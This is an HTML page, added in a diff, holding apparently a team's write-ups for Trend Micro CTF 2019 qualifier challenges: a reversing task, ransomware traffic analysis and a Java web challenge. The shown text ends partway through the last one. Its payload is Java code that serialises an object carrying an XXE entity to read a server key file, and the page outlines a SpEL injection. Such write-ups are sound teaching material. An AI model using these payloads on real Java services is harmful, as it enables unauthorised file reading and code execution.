@@ -1,0 +1,568 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Trend Micro CTF 2019 Quals</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                iot
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#200---reverse">200---reverse</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                mobile
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#100---adb-protocol-in-pcap">100---adb-protocol-in-pcap</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                forensics-exploit
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#300">300</a>
+    
+                <a class="dropdown-item" href="#400">400</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">iot</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#200---reverse" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">200---reverse</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">mobile</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#100---adb-protocol-in-pcap" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">100---adb-protocol-in-pcap</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">forensics-exploit</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#300" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">300</span>
+            </a>
+    
+<a href="#400" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">400</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="trend-micro-ctf-2019-quals"><a class="header-link" href="#trend-micro-ctf-2019-quals"></a>Trend Micro CTF 2019 Quals</h1>
+
+<h2 id="iot"><a class="header-link" href="#iot"></a>IoT</h2>
+<h3 id="200---reverse"><a class="header-link" href="#200---reverse"></a>200 - Reverse</h3>
+<ol class="list">
+<li>Replace RGC with UPX nd unpack it</li>
+<li>Reverse the binary. It will write the following content to <code>/etc/resolve.conf</code><pre class="hljs"><code><span class="hljs-selector-tag">nameserver</span> 8<span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span>
+<span class="hljs-selector-tag">search</span> <span class="hljs-selector-tag">somethingsomethingdarkside</span><span class="hljs-selector-class">.org</span></code></pre></li>
+<li>guessing: look up its <code>TXT</code> record we got <code>GZPGS{NjrfbzrNEZErirefreLbhNer}</code></li>
+<li>It&#39;s encrypted/encoded in Caesar cipher. <code>TMCTF{AwesomeARMReverserYouAre}</code></li>
+</ol>
+<h2 id="mobile"><a class="header-link" href="#mobile"></a>Mobile</h2>
+<h3 id="100---adb-protocol-in-pcap"><a class="header-link" href="#100---adb-protocol-in-pcap"></a>100 - ADB protocol in PCAP</h3>
+<p>Wireshark has a feature <code>decode as</code>. Choose ADB so we can further analyze the command.</p>
+<p>On packet No.1297, we found this suspicous commands:</p>
+<pre class="hljs"><code><span class="hljs-built_in">shell</span>:pm <span class="hljs-string">'install'</span> <span class="hljs-string">'/data/local/tmp/Locker.apk'</span>
+<span class="hljs-built_in">shell</span>:rm -f <span class="hljs-string">'/data/local/tmp/Locker.apk'</span>
+<span class="hljs-built_in">shell</span>:am <span class="hljs-built_in">start</span> -n com.locker.updater/.MainActivity</code></pre><p>Apparently this ransomware <code>locker.apk</code> is the key to this challenge. We then extract this APK starting from No. 717. Note that some of the packets are transmitted via SIGCOMP compression. Wireshark seems to fail to decode individual packet. Thus, we have to manully remove those annoying text commands <code>DATA</code> and <code>WRTE</code> in the data segment.</p>
+<p>Anyway, we first follow the TCP stream and save all the data into a hex file. We&#39;ll use a script to strip those text commands.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+
+h = open(<span class="hljs-string">'hex'</span>, <span class="hljs-string">'r'</span>).read().strip()
+
+write = <span class="hljs-string">b'WRTE'</span>.hex()
+a = h.split(write)[<span class="hljs-number">1</span>:]
+<span class="hljs-keyword">for</span> idx, i <span class="hljs-keyword">in</span> enumerate(a):
+    b = bytes.fromhex(i)
+    data = b[<span class="hljs-number">5</span>*<span class="hljs-number">4</span> + (<span class="hljs-number">8</span> <span class="hljs-keyword">if</span> idx == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>):]
+    <span class="hljs-keyword">if</span> idx == <span class="hljs-number">16</span>:
+        data = data.replace(<span class="hljs-string">b'DATA\xe9\x90\x00\x00'</span>, <span class="hljs-string">b''</span>)
+    print(data.hex(), end=<span class="hljs-string">''</span>)</code></pre><p>After extracting the apk file, use <code>dex2jar</code> and <code>jd-gui</code> to decompile the program. The password for this ransomware is</p>
+<pre class="hljs"><code>  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> == <span class="hljs-keyword">null</span>)
+      Ff19366e4.access$<span class="hljs-number">0</span>(); 
+    Exist.started();
+    <span class="hljs-keyword">byte</span>[] arrayOfByte = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">24</span>];
+    arrayOfByte[<span class="hljs-number">0</span>] = <span class="hljs-number">24</span>;
+    arrayOfByte[<span class="hljs-number">1</span>] = <span class="hljs-number">2</span>;
+    arrayOfByte[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;
+    arrayOfByte[<span class="hljs-number">3</span>] = <span class="hljs-number">31</span>;
+    arrayOfByte[<span class="hljs-number">4</span>] = <span class="hljs-number">3</span>;
+    arrayOfByte[<span class="hljs-number">5</span>] = <span class="hljs-number">41</span>;
+    arrayOfByte[<span class="hljs-number">6</span>] = <span class="hljs-number">11</span>;
+    arrayOfByte[<span class="hljs-number">7</span>] = <span class="hljs-number">32</span>;
+    arrayOfByte[<span class="hljs-number">8</span>] = <span class="hljs-number">44</span>;
+    arrayOfByte[<span class="hljs-number">9</span>] = <span class="hljs-number">47</span>;
+    arrayOfByte[<span class="hljs-number">10</span>] = <span class="hljs-number">9</span>;
+    arrayOfByte[<span class="hljs-number">11</span>] = <span class="hljs-number">39</span>;
+    arrayOfByte[<span class="hljs-number">12</span>] = <span class="hljs-number">47</span>;
+    arrayOfByte[<span class="hljs-number">13</span>] = <span class="hljs-number">36</span>;
+    arrayOfByte[<span class="hljs-number">14</span>] = <span class="hljs-number">14</span>;
+    arrayOfByte[<span class="hljs-number">15</span>] = <span class="hljs-number">50</span>;
+    arrayOfByte[<span class="hljs-number">16</span>] = <span class="hljs-number">3</span>;
+    arrayOfByte[<span class="hljs-number">17</span>] = <span class="hljs-number">32</span>;
+    arrayOfByte[<span class="hljs-number">18</span>] = <span class="hljs-number">37</span>;
+    arrayOfByte[<span class="hljs-number">19</span>] = <span class="hljs-number">42</span>;
+    arrayOfByte[<span class="hljs-number">20</span>] = <span class="hljs-number">45</span>;
+    arrayOfByte[<span class="hljs-number">21</span>] = <span class="hljs-number">47</span>;
+    arrayOfByte[<span class="hljs-number">22</span>] = <span class="hljs-number">100</span>;
+    arrayOfByte[<span class="hljs-number">23</span>] = <span class="hljs-number">47</span>;
+    arrayOfByte;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">byte</span> b = <span class="hljs-number">0</span>; b &lt; arrayOfByte.length; b++) {
+      <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">6</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">76</span>;
+      <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">6</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">79</span>;
+      <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">6</span>][<span class="hljs-number">2</span>] = <span class="hljs-number">67</span>;
+      <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">6</span>][<span class="hljs-number">3</span>] = <span class="hljs-number">75</span>;
+      <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">6</span>][<span class="hljs-number">4</span>] = <span class="hljs-number">69</span>;
+      <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">6</span>][<span class="hljs-number">5</span>] = <span class="hljs-number">82</span>;
+      arrayOfByte[b] = (<span class="hljs-keyword">byte</span>)(arrayOfByte[b] ^ <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">6</span>][b % <span class="hljs-number">6</span>]);
+    } 
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> String(arrayOfByte, StandardCharsets.UTF_8);
+  }</code></pre><p>It&#39;s just a simple XOR encryption. The flag is <code>TMCTF{GoodLuckMyFriend!}</code>.</p>
+<h2 id="forensics-exploit"><a class="header-link" href="#forensics-exploit"></a>Forensics-Exploit</h2>
+<h3 id="300"><a class="header-link" href="#300"></a>300</h3>
+<p>In this challenge, we have a <code>blueprint.war</code> file.</p>
+<p>Unzip this war file, we will get the class files and we can decompile it.</p>
+<p>Person.java:</p>
+<pre class="hljs"><code><span class="hljs-keyword">package</span> com.trendmicro;
+
+<span class="hljs-keyword">import</span> org.xml.sax.SAXException;
+<span class="hljs-keyword">import</span> javax.xml.parsers.ParserConfigurationException;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> org.w3c.dom.Node;
+<span class="hljs-keyword">import</span> org.w3c.dom.NodeList;
+<span class="hljs-keyword">import</span> org.w3c.dom.Document;
+<span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilder;
+<span class="hljs-keyword">import</span> java.io.InputStream;
+<span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;
+<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
+<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
+<span class="hljs-keyword">import</span> java.io.Serializable;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span>
+</span>{
+    <span class="hljs-keyword">public</span> String name;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = -<span class="hljs-number">559038737L</span>;
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String name)</span> </span>{
+        <span class="hljs-keyword">this</span>.name = name;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> ObjectInputStream aInputStream)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, ParserConfigurationException, SAXException </span>{
+        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> paramInt = aInputStream.readInt();
+        <span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] arrayOfByte = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[paramInt];
+        aInputStream.read(arrayOfByte);
+        <span class="hljs-keyword">final</span> ByteArrayInputStream localByteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(arrayOfByte);
+        <span class="hljs-keyword">final</span> DocumentBuilderFactory localDocumentBuilderFactory = DocumentBuilderFactory.newInstance();
+        localDocumentBuilderFactory.setNamespaceAware(<span class="hljs-keyword">true</span>);
+        <span class="hljs-keyword">final</span> DocumentBuilder localDocumentBuilder = localDocumentBuilderFactory.newDocumentBuilder();
+        <span class="hljs-keyword">final</span> Document localDocument = localDocumentBuilder.parse(localByteArrayInputStream);
+        <span class="hljs-keyword">final</span> NodeList nodeList = localDocument.getElementsByTagName(<span class="hljs-string">"tag"</span>);
+        <span class="hljs-keyword">final</span> Node node = nodeList.item(<span class="hljs-number">0</span>);
+        <span class="hljs-keyword">this</span>.name = node.getTextContent();
+    }
+}</code></pre><p>CustomOIS.java:</p>
+<pre class="hljs"><code><span class="hljs-keyword">package</span> com.trendmicro;
+
+<span class="hljs-keyword">import</span> java.util.<span class="hljs-type">Arrays</span>;
+<span class="hljs-keyword">import</span> java.io.<span class="hljs-type">ObjectStreamClass</span>;
+<span class="hljs-keyword">import</span> java.io.<span class="hljs-type">IOException</span>;
+<span class="hljs-keyword">import</span> java.io.<span class="hljs-type">InputStream</span>;
+<span class="hljs-keyword">import</span> javax.servlet.<span class="hljs-type">ServletInputStream</span>;
+<span class="hljs-keyword">import</span> java.io.<span class="hljs-type">ObjectInputStream</span>;
+
+public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CustomOIS</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ObjectInputStream</span></span>
+{
+    <span class="hljs-keyword">private</span> static <span class="hljs-keyword">final</span> <span class="hljs-type">String</span>[] whitelist;
+
+    static {
+        whitelist = <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[] { <span class="hljs-string">"com.trendmicro.Person"</span> };
+    }
+
+    public <span class="hljs-type">CustomOIS</span>(<span class="hljs-keyword">final</span> <span class="hljs-type">ServletInputStream</span> is) <span class="hljs-keyword">throws</span> <span class="hljs-type">IOException</span> {
+        <span class="hljs-keyword">super</span>((<span class="hljs-type">InputStream</span>)is);
+    }
+
+    public <span class="hljs-type">Class</span>&lt;?&gt; resolveClass(<span class="hljs-keyword">final</span> <span class="hljs-type">ObjectStreamClass</span> des) <span class="hljs-keyword">throws</span> <span class="hljs-type">IOException</span>, <span class="hljs-type">ClassNotFoundException</span> {
+        <span class="hljs-keyword">if</span> (!<span class="hljs-type">Arrays</span>.asList(<span class="hljs-type">CustomOIS</span>.whitelist).contains(des.getName())) {
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">ClassNotFoundException</span>(<span class="hljs-string">"Cannot deserialize "</span> + des.getName());
+        }
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.resolveClass(des);
+    }
+}</code></pre><p>Office.java:</p>
+<pre class="hljs"><code><span class="hljs-keyword">package</span> com.trendmicro;
+
+<span class="hljs-keyword">import</span> java.nio.file.Files;
+<span class="hljs-keyword">import</span> java.nio.file.Paths;
+<span class="hljs-keyword">import</span> java.nio.charset.Charset;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> javax.servlet.ServletException;
+<span class="hljs-keyword">import</span> org.springframework.expression.Expression;
+<span class="hljs-keyword">import</span> org.springframework.expression.ExpressionParser;
+<span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;
+<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
+<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
+
+@WebServlet({ <span class="hljs-string">"/Office"</span> })
+<span class="hljs-keyword">public</span> class Office extends HttpServlet
+{
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1</span>L;
+
+    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> doGet(<span class="hljs-keyword">final</span> HttpServletRequest request, <span class="hljs-keyword">final</span> HttpServletResponse response) <span class="hljs-keyword">throws</span> ServletException, IOException {
+        <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> nametag = request.getParameter(<span class="hljs-string">"nametag"</span>);
+        <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> keyParam = request.getParameter(<span class="hljs-string">"key"</span>);
+        <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> keyFileLocation = <span class="hljs-string">"/TMCTF2019/key"</span>;
+        <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> <span class="hljs-built_in">key</span> = readFile(keyFileLocation, StandardCharsets.UTF_8);
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">key</span>.contentEquals(keyParam)) {
+            <span class="hljs-keyword">final</span> ExpressionParser parser = (ExpressionParser)<span class="hljs-keyword">new</span> SpelExpressionParser();
+            <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> expString = <span class="hljs-string">"'"</span> + nametag + <span class="hljs-string">"' == 'Marshal'"</span>;
+            <span class="hljs-keyword">final</span> Expression <span class="hljs-built_in">exp</span> = parser.parseExpression(expString);
+            <span class="hljs-keyword">final</span> Boolean isMarshal = (Boolean)<span class="hljs-built_in">exp</span>.getValue();
+            <span class="hljs-keyword">if</span> (isMarshal) {
+                response.getWriter().<span class="hljs-built_in">append</span>(<span class="hljs-string">"Welcome Marsal"</span>);
+            }
+            <span class="hljs-keyword">else</span> {
+                response.getWriter().<span class="hljs-built_in">append</span>(<span class="hljs-string">"I am sorry but you cannot see the Marshal"</span>);
+            }
+        }
+        <span class="hljs-keyword">else</span> {
+            response.getWriter().<span class="hljs-built_in">append</span>(<span class="hljs-string">"Did you forget your keys Marshal?"</span>);
+        }
+    }
+
+    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> doPost(<span class="hljs-keyword">final</span> HttpServletRequest request, <span class="hljs-keyword">final</span> HttpServletResponse response) <span class="hljs-keyword">throws</span> ServletException, IOException {
+        <span class="hljs-keyword">this</span>.doGet(request, response);
+    }
+
+    <span class="hljs-keyword">static</span> <span class="hljs-keyword">String</span> readFile(<span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> path, <span class="hljs-keyword">final</span> Charset encoding) <span class="hljs-keyword">throws</span> IOException {
+        <span class="hljs-keyword">final</span> <span class="hljs-built_in">byte</span>[] encoded = Files.readAllBytes(Paths.<span class="hljs-built_in">get</span>(path, <span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>[<span class="hljs-number">0</span>]));
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>(encoded, encoding);
+    }
+}</code></pre><p>Server.java:</p>
+<pre class="hljs"><code><span class="hljs-keyword">package</span> com.trendmicro;
+
+<span class="hljs-keyword">import</span> java.io.<span class="hljs-type">IOException</span>;
+<span class="hljs-keyword">import</span> javax.servlet.<span class="hljs-type">ServletException</span>;
+<span class="hljs-keyword">import</span> javax.servlet.<span class="hljs-type">ServletInputStream</span>;
+<span class="hljs-keyword">import</span> javax.servlet.http.<span class="hljs-type">HttpServletResponse</span>;
+<span class="hljs-keyword">import</span> javax.servlet.http.<span class="hljs-type">HttpServletRequest</span>;
+<span class="hljs-keyword">import</span> javax.servlet.annotation.<span class="hljs-type">WebServlet</span>;
+<span class="hljs-keyword">import</span> javax.servlet.http.<span class="hljs-type">HttpServlet</span>;
+
+<span class="hljs-meta">@WebServlet</span>({ <span class="hljs-string">"/jail"</span> })
+public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Server</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span></span>
+{
+    <span class="hljs-keyword">private</span> static <span class="hljs-keyword">final</span> long serialVersionUID = <span class="hljs-number">1</span>L;
+
+    <span class="hljs-keyword">protected</span> void doPost(<span class="hljs-keyword">final</span> <span class="hljs-type">HttpServletRequest</span> request, <span class="hljs-keyword">final</span> <span class="hljs-type">HttpServletResponse</span> response) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> {
+        <span class="hljs-keyword">try</span> {
+            <span class="hljs-keyword">final</span> <span class="hljs-type">ServletInputStream</span> is = request.getInputStream();
+            <span class="hljs-keyword">final</span> <span class="hljs-type">CustomOIS</span> ois = <span class="hljs-keyword">new</span> <span class="hljs-type">CustomOIS</span>(is);
+            <span class="hljs-keyword">final</span> <span class="hljs-type">Person</span> person = (<span class="hljs-type">Person</span>)ois.readObject();
+            ois.close();
+            response.getWriter().append(<span class="hljs-string">"Sorry "</span> + person.name + <span class="hljs-string">". I cannot let you have the Flag!."</span>);
+        }
+        <span class="hljs-keyword">catch</span> (<span class="hljs-type">Exception</span> e) {
+            response.setStatus(<span class="hljs-number">500</span>);
+            e.printStackTrace(response.getWriter());
+        }
+    }
+}</code></pre><p>So our target is to unserialize the Person object, then trigger the XXE to read the key.</p>
+<p>After that, we can use the key to do SpEL injection and run the <code>getFlag()</code>.</p>
+<p>Payload:</p>
+<pre class="hljs"><code>package com.trendmicro;
+
+<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
+<span class="hljs-keyword">import</span> java.io.FileInputStream;
+<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
+<span class="hljs-keyword">import</span> java.io.FileOutputStream;
+<span class="hljs-keyword">import</span> java.io.Serializable;
+<span class="hljs-keyword">import</span> org.xml.sax.SAXException;
+<span class="hljs-keyword">import</span> javax.xml.parsers.ParserConfigurationException;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> org.w3c.dom.Node;
+<span class="hljs-keyword">import</span> org.w3c.dom.NodeList;
+<span class="hljs-keyword">import</span> org.w3c.dom.Document;
+<span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilder;
+<span class="hljs-keyword">import</span> java.io.InputStream;
+<span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;
+<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SerializeTest</span> </span>{
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-type">String</span> args[]) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span> {
+
+        <span class="hljs-type">Person</span> p = new <span class="hljs-type">Person</span>(<span class="hljs-string">"kaibro"</span>);
+        <span class="hljs-type">FileOutputStream</span> fos = new <span class="hljs-type">FileOutputStream</span>(<span class="hljs-string">"name.ser"</span>);
+        <span class="hljs-type">ObjectOutputStream</span> os = new <span class="hljs-type">ObjectOutputStream</span>(fos);
+        os.writeObject(p);
+        os.close();
+
+    }
+}
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> <span class="hljs-title">implements</span> <span class="hljs-title">Serializable</span> </span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> name;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> long serialVersionUID = -559038737L;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-type">Person</span>(<span class="hljs-keyword">final</span> <span class="hljs-type">String</span> name) {
+        this.name = name;
+    }
+
+    <span class="hljs-keyword">private</span> void writeObject(<span class="hljs-type">ObjectOutputStream</span> stream) <span class="hljs-keyword">throws</span> <span class="hljs-type">ClassNotFoundException</span>, <span class="hljs-type">IOException</span>,
+        <span class="hljs-type">ParserConfigurationException</span>, <span class="hljs-type">SAXException</span> {
+        stream.writeInt(<span class="hljs-number">100</span>);
+        <span class="hljs-type">String</span> s = (<span class="hljs-string">"&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE kaibro[&lt;!ENTITY xxe SYSTEM \"file:///TMCTF2019/key\"&gt;]&gt;&lt;tag&gt;&amp;xxe;&lt;/tag&gt;"</span>);
+        byte[] tmp = s.getBytes();
+        stream.write(tmp);
+    }
